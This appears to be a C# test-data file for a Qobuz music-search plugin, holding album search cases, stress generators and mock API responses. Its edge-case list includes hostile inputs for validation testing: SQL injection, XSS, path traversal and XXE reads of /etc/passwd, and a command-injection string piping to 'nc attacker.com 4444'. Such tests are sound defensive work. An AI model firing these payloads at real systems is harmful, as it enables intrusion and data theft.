using System;
using System.Collections.Generic;
using System.Linq;
using Lidarr.Plugin.Qobuzarr.Models;

namespace Qobuzarr.Tests.TestData
{
    /// <summary>
    /// Centralized comprehensive test data for all search-related tests.
    /// Contains the most complex edge cases for thorough testing.
    /// 
    /// SECURITY WARNING: This file contains test data that simulates various attack vectors.
    /// These patterns are ONLY for testing input validation and sanitization.
    /// NEVER execute these patterns against real systems or databases.
    /// All test execution MUST be isolated in test environments only.
    /// </summary>
    public static class ComprehensiveSearchTestData
    {
        private static bool _isTestEnvironment = false;
        
        /// <summary>
        /// Must be explicitly enabled for test execution
        /// </summary>
        public static void EnableForTesting()
        {
            _isTestEnvironment = true;
        }
        
        private static void EnsureTestEnvironment()
        {
            if (!_isTestEnvironment)
            {
                throw new InvalidOperationException(
                    "Security: Test data containing attack vectors can only be accessed in test environment. " +
                    "Call EnableForTesting() explicitly in test setup.");
            }
        }
        
        #region Extreme Edge Cases

        /// <summary>
        /// The most challenging search cases that combine multiple complexity factors
        /// WARNING: These are simulated attack patterns for security testing only.
        /// They should NEVER be executed against production systems.
        /// </summary>
        public static class ExtremeEdgeCases
        {
            private static readonly List<SearchTestCase> _cases = new()
            {
                // SQL Injection + XSS + Path Traversal combo
                new("'; DROP TABLE albums; <script>alert('xss')</script>--", 
                    "../../../etc/passwd", 
                    "Multi-vector injection attack",
                    SearchComplexity.Malicious),

                // Unicode normalization attack
                new("Å" /* U+00C5 */, "Å" /* U+212B (Angstrom) */, 
                    "Visually identical but different Unicode",
                    SearchComplexity.Unicode),

                // Zero-width character injection
                new("Nor​mal​Artist", "Nor​mal​Album", 
                    "Contains zero-width spaces (U+200B)",
                    SearchComplexity.Invisible),

                // Homograph attack
                new("Аррӏе", "Мusіс", // Cyrillic chars that look like Latin
                    "Cyrillic homograph attack (fake Apple Music)",
                    SearchComplexity.Homograph),

                // Maximum length with special chars
                new(new string('A', 500) + "!@#$%^&*()", 
                    new string('B', 500) + "<>?:\"|{}[]", 
                    "Max length with special characters",
                    SearchComplexity.Length),

                // Null byte injection
                new("Artist\0Name", "Album\0Title", 
                    "Null byte injection attempt",
                    SearchComplexity.NullByte),

                // Unicode direction override
                new("Artist‮⁦TROJAN⁩⁦", "Album‮⁦HIDDEN⁩⁦", 
                    "Right-to-left override attack",
                    SearchComplexity.Bidirectional),

                // Combined emoji and special chars
                new("🎵AC⚡DC🎸", "🔥Back🎯in⚫Black🔥", 
                    "Emoji with special characters",
                    SearchComplexity.Mixed),

                // Nested encoding attempts
                new("%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E", 
                    "&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;", 
                    "Multiple encoding layers",
                    SearchComplexity.Encoded),

                // Control characters
                new("Artist\r\nHeader: Injection", "Album\tTab\bBackspace", 
                    "Control character injection",
                    SearchComplexity.Control),

                // Integer overflow attempt
                new(int.MaxValue.ToString(), long.MaxValue.ToString(), 
                    "Integer overflow values",
                    SearchComplexity.Numeric),

                // Format string attack
                new("%s%s%s%s%s%s%s%s", "%n%n%n%n%n", 
                    "Format string vulnerability probe",
                    SearchComplexity.Format),

                // Command injection
                new("Artist; cat /etc/passwd", "Album | nc attacker.com 4444", 
                    "Command injection attempt",
                    SearchComplexity.Command),

                // LDAP injection
                new("*)(uid=*", "*)(|(uid=*", 
                    "LDAP injection attempt",
                    SearchComplexity.LDAP),

                // XML injection
                new("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", 
                    "<foo>&xxe;</foo>", 
                    "XXE injection attempt",
                    SearchComplexity.XML),

                // Regex DoS
                new("(a+)+$", "^(a+)+$", 
                    "ReDoS pattern",
                    SearchComplexity.Regex),

                // Unicode case folding edge case
                new("ß", "SS", // German sharp s
                    "Unicode case folding complexity",
                    SearchComplexity.CaseFolding),

                // Combining diacriticals overload
                new("A" + string.Concat(Enumerable.Repeat("\u0301", 50)), // 50 combining acute accents
                    "B" + string.Concat(Enumerable.Repeat("\u0308", 50)), // 50 combining diaeresis
                    "Zalgo text generator pattern",
                    SearchComplexity.Zalgo),

                // Mixed scripts security
                new("Paypal", "Pаypаl", // Second has Cyrillic 'a'
                    "Mixed script confusion",
                    SearchComplexity.MixedScript),

                // Time-based patterns
                new($"Artist_{DateTime.Now.Ticks}", $"Album_{Guid.NewGuid()}", 
                    "Dynamic time-based values",
                    SearchComplexity.Dynamic)
            };
            
            /// <summary>
            /// Get test cases (requires test environment to be enabled)
            /// </summary>
            public static List<SearchTestCase> Cases 
            { 
                get 
                { 
                    EnsureTestEnvironment(); 
                    return _cases; 
                } 
            }
        }

        #endregion

        #region Real-World Problem Cases

        /// <summary>
        /// Actual problematic cases reported by users or found in production
        /// </summary>
        public static class RealWorldProblems
        {
            public static readonly List<SearchTestCase> Cases = new()
            {
                // Various Artists complications
                new("Various Artists", "NOW That's What I Call Music! 109", 
                    "Compilation album with number",
                    SearchComplexity.Compilation),

                new("Various", "Grammy Nominees 2023", 
                    "Shortened various artists",
                    SearchComplexity.Compilation),

                // Deluxe/Special editions
                new("Taylor Swift", "Midnights (3am Edition) [Deluxe Version] {Target Exclusive}", 
                    "Multiple edition markers",
                    SearchComplexity.Edition),

                new("The Beatles", "Abbey Road (2019 Mix) [Super Deluxe Edition]", 
                    "Remaster with edition",
                    SearchComplexity.Edition),

                // Live albums with venue
                new("Pink Floyd", "The Wall: Live in Berlin (Roger Waters) [1990]", 
                    "Live with artist note and year",
                    SearchComplexity.Live),

                // Classical music complexity
                new("Herbert von Karajan", 
                    "Beethoven: Symphony No. 9 in D Minor, Op. 125 \"Choral\" - Berlin Philharmonic Orchestra", 
                    "Classical with opus and orchestra",
                    SearchComplexity.Classical),

                // Featuring multiple artists
                new("Eminem feat. Rihanna, Skylar Grey & Dr. Dre", 
                    "The Monster (Explicit) [Single]", 
                    "Multiple featured artists",
                    SearchComplexity.Featured),

                // Soundtrack complications
                new("Hans Zimmer", 
                    "Inception (Music from the Motion Picture) [Expanded Edition]", 
                    "Soundtrack with edition",
                    SearchComplexity.Soundtrack),

                // Foreign language with translation
                new("Rammstein", 
                    "Zeit (Time) / 時間", 
                    "Multiple language titles",
                    SearchComplexity.Multilingual),

                // Disc/Volume numbers
                new("The Beatles", 
                    "The Beatles (The White Album) [Disc 1]", 
                    "Multi-disc indicator",
                    SearchComplexity.MultiDisc),

                // EP vs Album confusion
                new("Billie Eilish", 
                    "Guitar Songs - EP", 
                    "EP designation",
                    SearchComplexity.ReleaseType),

                // Remix albums
                new("Daft Punk", 
                    "Human After All: Remixes", 
                    "Remix album",
                    SearchComplexity.Remix),

                // Anniversary editions
                new("Nirvana", 
                    "Nevermind (30th Anniversary Super Deluxe Edition)", 
                    "Anniversary edition",
                    SearchComplexity.Anniversary),

                // Box sets
                new("Bob Dylan", 
                    "The Bootleg Series Vol. 16: Springtime in New York 1980-1985", 
                    "Bootleg series volume",
                    SearchComplexity.BoxSet),

                // Collaborative albums
                new("Jay-Z & Kanye West", 
                    "Watch the Throne (Deluxe)", 
                    "Collaboration with ampersand",
                    SearchComplexity.Collaboration),

                // Split releases
                new("Godspeed You! Black Emperor / Exhaust", 
                    "Split EP", 
                    "Split release",
                    SearchComplexity.Split)
            };
        }

        #endregion

        #region Performance Stress Cases

        /// <summary>
        /// Cases designed to stress test performance and memory
        /// </summary>
        public static class PerformanceStressCases
        {
            private static readonly Random _random = new Random(42); // Deterministic for tests

            public static SearchTestCase GenerateMaxLengthCase()
            {
                const int maxLength = 2000;
                return new(
                    new string('X', maxLength),
                    new string('Y', maxLength),
                    "Maximum length strings",
                    SearchComplexity.Length
                );
            }

            public static SearchTestCase GenerateHighEntropyCase()
            {
                var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()";
                var artist = new string(Enumerable.Range(0, 100).Select(_ => chars[_random.Next(chars.Length)]).ToArray());
                var album = new string(Enumerable.Range(0, 100).Select(_ => chars[_random.Next(chars.Length)]).ToArray());
                
                return new(artist, album, "High entropy random strings", SearchComplexity.Random);
            }

            public static SearchTestCase GenerateRepeatingPatternCase()
            {
                return new(
                    string.Concat(Enumerable.Repeat("AbC", 100)),
                    string.Concat(Enumerable.Repeat("123", 100)),
                    "Repeating patterns",
                    SearchComplexity.Pattern
                );
            }

            public static IEnumerable<SearchTestCase> GenerateBulkCases(int count)
            {
                for (int i = 0; i < count; i++)
                {
                    yield return new SearchTestCase(
                        $"BulkArtist_{i:D6}_{Guid.NewGuid():N}",
                        $"BulkAlbum_{i:D6}_{DateTime.UtcNow.Ticks}",
                        $"Bulk test case {i}",
                        SearchComplexity.Bulk
                    );
                }
            }
        }

        #endregion

        #region Mock API Responses

        /// <summary>
        /// Pre-built API responses for testing
        /// </summary>
        public static class MockApiResponses
        {
            public static string EmptySearchResult => @"{
                ""albums"": {
                    ""items"": [],
                    ""total"": 0
                }
            }";

            public static string SingleAlbumResult => @"{
                ""albums"": {
                    ""items"": [{
                        ""id"": ""test123"",
                        ""title"": ""Test Album"",
                        ""version"": ""Deluxe"",
                        ""artist"": {
                            ""id"": ""456"",
                            ""name"": ""Test Artist""
                        },
                        ""released_at"": 1609459200,
                        ""tracks_count"": 10,
                        ""maximum_bit_depth"": 24,
                        ""maximum_sample_rate"": 96.0
                    }],
                    ""total"": 1
                }
            }";

            public static string MultipleAlbumsResult => @"{
                ""albums"": {
                    ""items"": [
                        {
                            ""id"": ""album1"",
                            ""title"": ""First Album"",
                            ""artist"": { ""name"": ""Artist One"" },
                            ""released_at"": 1609459200
                        },
                        {
                            ""id"": ""album2"",
                            ""title"": ""Second Album"",
                            ""artist"": { ""name"": ""Artist Two"" },
                            ""released_at"": 1609459300
                        },
                        {
                            ""id"": ""album3"",
                            ""title"": ""Third Album"",
                            ""artist"": { ""name"": ""Artist Three"" },
                            ""released_at"": 1609459400
                        }
                    ],
                    ""total"": 3
                }
            }";

            public static string MalformedJsonResponse => @"{
                ""albums"": {
                    ""items"": [
                        { ""id"": ""123"", ""title"": ""Valid"" },
                        { ""id"": , ""title"": ""Invalid"" ,
                        { ""id"": ""456"" ""title"": ""Missing comma"" }
                        { id: ""789"", title: ""No quotes"" }
                    ]
                }";

            public static string ApiErrorResponse => @"{
                ""code"": 401,
                ""message"": ""Invalid authentication token"",
                ""status"": ""TokenExpired""
            }";

            public static string RateLimitResponse => @"{
                ""error"": {
                    ""code"": 429,
                    ""message"": ""Rate limit exceeded. Please retry after 60 seconds."",
                    ""retry_after"": 60
                }
            }";

            public static string HtmlErrorPage => @"<!DOCTYPE html>
                <html>
                <head><title>502 Bad Gateway</title></head>
                <body>
                    <h1>502 Bad Gateway</h1>
                    <p>The server returned an invalid response.</p>
                </body>
                </html>";

            public static string GenerateLargeResponse(int albumCount)
            {
                var albums = Enumerable.Range(1, albumCount).Select(i => $@"{{
                    ""id"": ""{Guid.NewGuid():N}"",
                    ""title"": ""Generated Album {i}"",
                    ""artist"": {{ ""name"": ""Generated Artist {i % 100}"" }},
                    ""released_at"": {1609459200 + i},
                    ""tracks_count"": {10 + (i % 20)}
                }}");

                return $@"{{
                    ""albums"": {{
                        ""items"": [{string.Join(",", albums)}],
                        ""total"": {albumCount}
                    }}
                }}";
            }
        }

        #endregion

        #region Test Case Model

        public class SearchTestCase
        {
            public string ArtistName { get; }
            public string AlbumTitle { get; }
            public string Description { get; }
            public SearchComplexity Complexity { get; }
            public DateTime CreatedAt { get; }
            public Dictionary<string, object> Metadata { get; }

            public SearchTestCase(string artistName, string albumTitle, string description, SearchComplexity complexity = SearchComplexity.Simple)
            {
                ArtistName = artistName;
                AlbumTitle = albumTitle;
                Description = description;
                Complexity = complexity;
                CreatedAt = DateTime.UtcNow;
                Metadata = new Dictionary<string, object>();
            }

            public override string ToString() => $"{ArtistName} - {AlbumTitle} ({Description})";

            public string ToSearchQuery() => $"{ArtistName} {AlbumTitle}".Trim();

            public bool RequiresSpecialHandling() => Complexity >= SearchComplexity.Complex;

            public bool IsMalicious() => Complexity == SearchComplexity.Malicious;
        }

        public enum SearchComplexity
        {
            Simple = 0,
            Medium = 1,
            Complex = 2,
            
            // Special categories
            Unicode = 10,
            Invisible = 11,
            Homograph = 12,
            Length = 13,
            NullByte = 14,
            Bidirectional = 15,
            Mixed = 16,
            Encoded = 17,
            Control = 18,
            Numeric = 19,
            Format = 20,
            Command = 21,
            LDAP = 22,
            XML = 23,
            Regex = 24,
            CaseFolding = 25,
            Zalgo = 26,
            MixedScript = 27,
            Dynamic = 28,
            
            // Content types
            Compilation = 30,
            Edition = 31,
            Live = 32,
            Classical = 33,
            Featured = 34,
            Soundtrack = 35,
            Multilingual = 36,
            MultiDisc = 37,
            ReleaseType = 38,
            Remix = 39,
            Anniversary = 40,
            BoxSet = 41,
            Collaboration = 42,
            Split = 43,
            
            // Performance
            Random = 50,
            Pattern = 51,
            Bulk = 52,
            
            // Security
            Malicious = 100
        }

        #endregion

        #region Helper Methods

        /// <summary>
        /// Get all test cases across all categories
        /// </summary>
        public static IEnumerable<SearchTestCase> GetAllTestCases()
        {
            foreach (var testCase in ExtremeEdgeCases.Cases) yield return testCase;
            foreach (var testCase in RealWorldProblems.Cases) yield return testCase;
            yield return PerformanceStressCases.GenerateMaxLengthCase();
            yield return PerformanceStressCases.GenerateHighEntropyCase();
            yield return PerformanceStressCases.GenerateRepeatingPatternCase();
        }

        /// <summary>
        /// Get test cases by complexity level
        /// </summary>
        public static IEnumerable<SearchTestCase> GetByComplexity(SearchComplexity minComplexity)
        {
            return GetAllTestCases().Where(tc => tc.Complexity >= minComplexity);
        }

        /// <summary>
        /// Get only malicious/security test cases
        /// </summary>
        public static IEnumerable<SearchTestCase> GetSecurityTestCases()
        {
            return ExtremeEdgeCases.Cases.Where(tc => 
                tc.Complexity == SearchComplexity.Malicious ||
                tc.Complexity == SearchComplexity.Command ||
                tc.Complexity == SearchComplexity.LDAP ||
                tc.Complexity == SearchComplexity.XML ||
                tc.Complexity == SearchComplexity.NullByte);
        }

        /// <summary>
        /// Get Unicode-specific test cases
        /// </summary>
        public static IEnumerable<SearchTestCase> GetUnicodeTestCases()
        {
            return GetAllTestCases().Where(tc =>
                tc.Complexity == SearchComplexity.Unicode ||
                tc.Complexity == SearchComplexity.Bidirectional ||
                tc.Complexity == SearchComplexity.Zalgo ||
                tc.Complexity == SearchComplexity.MixedScript ||
                tc.Complexity == SearchComplexity.CaseFolding ||
                tc.Complexity == SearchComplexity.Homograph);
        }

        /// <summary>
        /// Create a QobuzAlbum from a test case
        /// </summary>
        public static QobuzAlbum CreateMockAlbum(SearchTestCase testCase)
        {
            return new QobuzAlbum
            {
                Id = Guid.NewGuid().ToString("N"),
                Title = testCase.AlbumTitle,
                Artist = new QobuzArtist
                {
                    Id = Guid.NewGuid().ToString("N"),
                    Name = testCase.ArtistName
                },
                ReleasedAtTimestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds(),
                TracksCount = 10,
                Streamable = true,
                Downloadable = true
            };
        }

        #endregion
    }
}